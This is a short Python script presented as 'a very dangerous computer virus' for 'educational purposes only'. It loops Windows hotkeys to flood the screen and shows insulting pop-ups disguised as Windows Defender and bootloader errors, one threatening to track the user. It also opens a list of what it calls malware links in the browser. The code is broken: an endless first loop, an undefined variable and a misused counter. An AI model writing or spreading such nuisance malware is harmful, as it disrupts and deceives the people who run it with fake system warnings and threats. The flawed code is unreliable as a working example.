
# This is a very dangerous computer virus.
# Educational purposes only.
# The creator is not responsible for anything!

# Importing the needed modules
import pyautogui
from tkinter import messagebox as mb
import webbrowser

# Assigning 'quitting' variables
quitFirst = False
quitSec = False
numberLine = 1

# Opening and storing data files
with open('links.txt', 'r', encoding='utf-8') as linksFile:
    linksExtraction = linksFile.read()
    links = linksExtraction.split('\n')
    linksFile.close()

with open('warnings.txt', 'r', encoding='utf-8') as warningFile:
    warningsExtraction = warningFile.read()
    warnings = warningsExtraction.split('///')
    warningFile.close()

# Defining the hotkeys
def openingInstances():
    while quitFirst == False:
        pyautogui.hotkey('win', 'e') # File Explorer
        pyautogui.hotkey('win', 'i') # Settings App
        pyautogui.hotkey('win', 'm') # Minimizing EVERYTHING xD
        
# Defining PopUps
def openingPopUps():
    openingInstances()
    while quitFirst == False:
        mb.showinfo("Windows Defender", "Bro are you damn stupid?!")
        mb.showwarning("Brrrr skibidi dop dop dop", "Yes, yes, yes, I just destroyed your PC! NICE!!!")
        mb.showerror("You Are An Actual Idiot!", "If you say 'I am not!' I will track you down!!!!")
        mb.askyesno("Couldn't find Bootloader", 'Try to find again???')
    
# Opening the malware links -Uh oh!-
def openingWeb():
    openingPopUps()
    if numberLine == 20122:
        quitSec = True
    while quitSec == False:
        webbrowser.open(link[numberLine])
        numberLine += 1
        if quitSec == True:
            break

# Showing the malware warnings
def warningBox():
    firstWarn = mb.askyesno("!! SECURITY WARNING !!", warnings[0])
    if firstWarn:
        secWarn = mb.askyesno("!! LAST WARNING !!", warnings[1])
        if secWarn:
            openingWeb()
        else:
            quit()
    else:
        quit()

if __name__ == '__main__':
    warningBox()
    